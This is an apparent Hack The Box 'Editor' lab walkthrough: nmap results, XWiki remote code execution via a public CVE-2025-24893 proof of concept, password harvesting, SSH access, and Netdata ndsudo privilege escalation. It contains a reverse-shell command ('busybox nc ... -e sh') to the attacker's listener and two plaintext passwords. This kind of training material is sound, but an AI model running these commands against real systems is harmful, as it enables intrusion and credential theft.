## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Editor]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.16.255 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 11:36 +0900
Nmap scan report for 10.129.16.255
Host is up (0.24s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.129.16.255:8080/xwiki/bin/view/Main/
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty(10.0.20)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   247.92 ms 10.10.14.1
2   248.24 ms 10.129.16.255

```


Use the link below to download the POC
```bash
git clone  https://github.com/gunzf0x/CVE-2025-24893.git
```
https://github.com/gunzf0x/CVE-2025-24893

![[Pasted image 20260305125246.png]]

Execute POC

```bash
python CVE-2025-24893.py -t 'http://10.129.16.255:8080' -c 'busybox nc 10.10.15.22 4444 -e sh'
```
![[Pasted image 20260305125405.png]]

Check access credentials

```bash
rlwrap nc -lnvp 4444  
```
![[Pasted image 20260305125806.png]]


### Lateral Movement

Enumerated /home directory and found a user “oliver”
![[Pasted image 20260309212011.png]]

Use the grep command to search for "passw"
Discovered "theEd1t0rTeam99", "xwikipassword2025"

![[Pasted image 20260309212142.png]]

obtained Oliver's credentials using nxc.
```bash
nxc ssh 10.129.5.5 -u 'oliver' -p password.txt
```
![[Pasted image 20260309212545.png]]

Connected SSH services
```bash
┌──(kali㉿kali)-[~/HTB/Editor]
└─$ ssh oliver@10.129.5.5                       
The authenticity of host '10.129.5.5 (10.129.5.5)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.5.5' (ED25519) to the list of known hosts.
oliver@10.129.5.5's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Mar  9 12:25:53 PM UTC 2026

  System load:  0.48              Processes:             231
  Usage of /:   63.7% of 7.28GB   Users logged in:       0
  Memory usage: 43%               IPv4 address for eth0: 10.129.5.5
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

4 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Mar 9 12:25:54 2026 from 10.10.14.42
oliver@editor:~$ whoami
oliver
```

Retrieved user.txt
![[Pasted image 20260309212910.png]]


### Privilege Escalation
Use linux-smart-enumeration to determine which ports are accessible only to local hosts.
```bash
bash lse.sh -i -l1
```

![[Pasted image 20260309215240.png]]


SSH port forwarding allows access to the inside.
```bash
ssh -L 8125:127.0.0.1:8125 -L 3306:127.0.0.1:3306 -L 8125:127.0.0.1:8125 -L 19999:127.0.0.1:19999 -L 33060:127.0.0.1:33060 -L 33281:127.0.0.1:33281 oliver@10.129.5.5 -f -N
```
![[Pasted image 20260309220046.png]]

```bash
#리스너 포트
netstat -antp | grep LISTEN
```
![[Pasted image 20260309220129.png]]


Use the link below to download the payload.
https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC
![[Pasted image 20260309220509.png]]

Compile payload
```bash
gcc -static payload.c -o nvme -Wall -Werror -Wpedantic
```

Upload payload

![[Pasted image 20260309220821.png]]

Execute payload and Retrieved root.txt
![[Pasted image 20260309221017.png]]